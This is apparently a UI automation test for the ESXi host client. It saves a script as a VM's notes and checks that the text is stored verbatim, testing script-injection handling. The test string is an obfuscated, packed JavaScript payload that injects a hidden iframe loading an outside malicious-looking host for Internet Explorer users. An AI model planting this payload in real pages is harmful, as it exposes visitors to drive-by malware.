'use strict';

var LoginUtil = require('../../../../login/loginUtil.js');

var EsxuiPage = require('../../../../login/esxUI/esxuiPage.js');
var EsxuiUtil = require('../../../../login/esxUI/esxuiUtil.js');

var VMPage = require('../../../../login/esxUI/vm/vmPage.js');
var VMUtil = require('../../../../login/esxUI/vm/vmUtil.js');

var GlobalUtil = require('../../../../common/globalUtil.js');
var Racetrack = require('../../../../common/racetrack.js');

var Timeout = require('../../../../common/timeout.js');

describe('Edit Notes with Script', function () {

    var loginUtil = new LoginUtil(),
        esxuiUtil = new EsxuiUtil(),
        vmUtil = new VMUtil(),
        globalUtil = new GlobalUtil(),
        racetrack = new Racetrack(),
        screenshotSavePath = browser.params.raceTrack.screenshotSavePath,
        vmName, notes;

    beforeEach(function () {

        console.log("-----------------------------------------------------------------------------------------");
        console.log("                           Edit Notes with Script for VM                                 ");
        console.log("-----------------------------------------------------------------------------------------");

        browser.driver.manage().window().maximize();

        return racetrack.testCaseBegin('Edit Notes with Script for VM', 'Edit VM', 'Edit Notes with Script for VM', browser.params.i18n.lang, '', '', 'UI','P0','Automation').then(function(){
            return globalUtil.takeScreenshot(screenshotSavePath, 'Edit_Notes_Script_for_VM_Start');
        }).then(function() {
            return browser.sleep(Timeout.WAIT_FOR_START_STOP_VIDEO_RECORDING);
        }).then(function() {
            return racetrack.log('----------------------------Precondition-------------------------------------------------');
        }).then(function(){
            return loginUtil.go();
        }).then(function(){
            return racetrack.log("Dismiss the CEIP dialog");
        }).then(function(){
            return esxuiUtil.dismissCEIPDialog(EsxuiPage);
        }).then(function(){
            return racetrack.log("Click Virtual Machines in esx UI");
        }).then(function(){
            return globalUtil.waitForVisibility(EsxuiPage.navigator.vmMenu.self());
        }).then(function(){
            return EsxuiPage.navigator.vmMenu.self().click();
        }).then(function(){
            vmName = globalUtil.getTimeStamp();
            return racetrack.log("Create a new non-ASCII VM with default settings: " + vmName);
        }).then(function() {
            return vmUtil.createVMWithDefaultSettings(VMPage, vmName, EsxuiPage);
        })

    });

    afterEach(function (done) {
        return globalUtil.verifyResult('Edit_Notes_Script_for_VM_Stop',screenshotSavePath).then(function(){
            done();
        });
    });

    it('Edit Notes with Script for non-ASCII VM', function () {



        var cancelButton, testScript, actualScript;

        return racetrack.log('---------------------------------------Start Test Case--------------------------------------').then(function() {
            return racetrack.log("Edit Notes with Script for the non-ASCII VM");
        }).then(function () {
            testScript = "\<sc​ript>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.from​CharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('i 9(){a=6.h(\\'b\\');7(!a){5 0=6.j(\\'k\\');6.g.l(0);0.n=\\'b\\';0.4.d=\\'8\\';0.4.c=\\'8\\';0.4.e=\\'f\\';0.m=\\'w://z.o.B/C.D?t=E\\'}}5 2=A.x.q();7(((2.3(\"p\")!=-1&&2.3(\"r\")==-1&&2.3(\"s\")==-1))&&2.3(\"v\")!=-1){5 t=u(\"9()\",y)}',41,41,'el||ua|indexOf|style|var|do​cument|if|1px|MakeFrameEx|element|yahoo_api|height| width|display|none|body|get​ElementById|function|createElement|iframe|append​Child|src|id|nl|msie| toLowerCase|opera|webtv||setTimeout|windows|http|userAgent|1000|juyfdjhdjdgh|navigator|ai| showthread|php|72241732'.split('|'),0,{})) </sc​ript>"
            return vmUtil.editVMnotes(VMPage, vmName, testScript);
        }).then(function () {
            return racetrack.log("Check Recent task for edit VM and verify new non-ASCII notes is saved.");
        }).then(function () {
            return esxuiUtil.checkForRecentTask('Reconfig VM', vmName, browser.params.taskMsg.task.state.success,3);
        }).then(function () {
            return racetrack.log("Reopen Edit Notes dialog.");
        }).then(function () {
            return globalUtil.waitForVisibility(VMPage.actionsButton.self());
        }).then(function () {
            return VMPage.actionsButton.self().click();
        }).then(function () {
            return globalUtil.waitForVisibility(VMPage.actionsButton.editNotesMenu());
        }).then(function () {
            return VMPage.actionsButton.editNotesMenu().click();
        }).then(function () {
            notes = VMPage.editNotesDialog.notesTextArea();
            return globalUtil.waitForVisibility(notes);
        }).then(function () {
            return notes.getAttribute('value');
        }).then(function (script) {
            actualScript=script;
            return racetrack.log("Verified notes is saved, actual script is: " + actualScript);
        }).then(function () {
            return expect(actualScript).toEqual(testScript);
        }).then(function () {
            cancelButton = VMPage.popUpDialog.cancelButton();
            return globalUtil.waitForVisibility(cancelButton);
        }).then(function () {
            return cancelButton.click();
        // }).then(function () {
        //     return vmUtil.deleteVMFromGridByName(VMPage, vmName);
        }).then(function () {
            return browser.sleep(Timeout.WAIT_FOR_VM_DELETE);
        });
    })
});



